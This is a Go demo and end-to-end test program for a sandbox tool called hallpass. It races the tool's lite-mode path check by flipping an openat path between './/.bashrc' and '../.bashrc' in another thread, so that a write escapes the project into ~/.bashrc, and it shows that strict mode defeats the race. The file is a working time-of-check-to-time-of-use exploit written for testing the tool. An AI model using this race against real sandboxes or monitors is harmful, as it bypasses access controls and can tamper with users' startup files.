// Command race races hallpass's check of an open(2) path, for the strict
// demo (demos/strict). Run it from a project directory just below $HOME.
//
// In lite mode, hallpass reads the path from the process's memory, decides,
// then lets the kernel run the syscall, which reads the path again. One
// thread opens the path in a buffer, another flips its second byte:
//
//	".//.bashrc"  ./.bashrc, in the project: allowed
//	"../.bashrc"  ~/.bashrc, outside: denied
//
// When hallpass reads the first and the kernel the second, the write lands in
// ~/.bashrc. The flip is one atomic store, so every path read is whole.
// Strict mode checks the file the kernel opens: the race never wins.
//
// race NAME races ./NAME and ../NAME instead (the kind e2e test).
package main

import (
	"fmt"
	"os"
	"runtime"
	"strings"
	"sync/atomic"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

func main() {
	name := ".bashrc"
	if len(os.Args) > 1 {
		name = os.Args[1]
	}
	var target unix.Stat_t
	if err := unix.Stat("../"+name, &target); err != nil {
		fmt.Fprintln(os.Stderr, "race:", err)
		os.Exit(2)
	}

	// The path, in words so that its first four bytes flip atomically.
	var path [64]uint32
	b := (*[256]byte)(unsafe.Pointer(&path))
	if len(name) > len(b)-4 || strings.Contains(name, "\x00") {
		fmt.Fprintln(os.Stderr, "race: bad name")
		os.Exit(2)
	}
	copy(b[:], ".//"+name+"\x00")
	inside := atomic.LoadUint32(&path[0])
	b[1] = '.'
	outside := atomic.LoadUint32(&path[0])

	var done atomic.Bool
	go func() {
		runtime.LockOSThread()
		for !done.Load() {
			atomic.StoreUint32(&path[0], inside)
			atomic.StoreUint32(&path[0], outside)
		}
	}()

	runtime.LockOSThread()
	cwd := unix.AT_FDCWD
	tries := 0
	for end := time.Now().Add(5 * time.Second); time.Now().Before(end); {
		tries++
		r, _, errno := unix.Syscall6(unix.SYS_OPENAT, uintptr(cwd), uintptr(unsafe.Pointer(b)),
			unix.O_WRONLY|unix.O_APPEND|unix.O_CREAT|unix.O_CLOEXEC, 0o644, 0, 0)
		if errno != 0 {
			continue
		}
		fd := int(r)
		var st unix.Stat_t
		if unix.Fstat(fd, &st) == nil && st.Dev == target.Dev && st.Ino == target.Ino {
			unix.Write(fd, []byte("# raced past hallpass\n"))
			unix.Close(fd)
			done.Store(true)
			fmt.Printf("escaped after %d tries: wrote to ../%s\n", tries, name)
			return
		}
		unix.Close(fd)
	}
	done.Store(true)
	fmt.Printf("no escape in %d tries\n", tries)
	os.Exit(1)
}
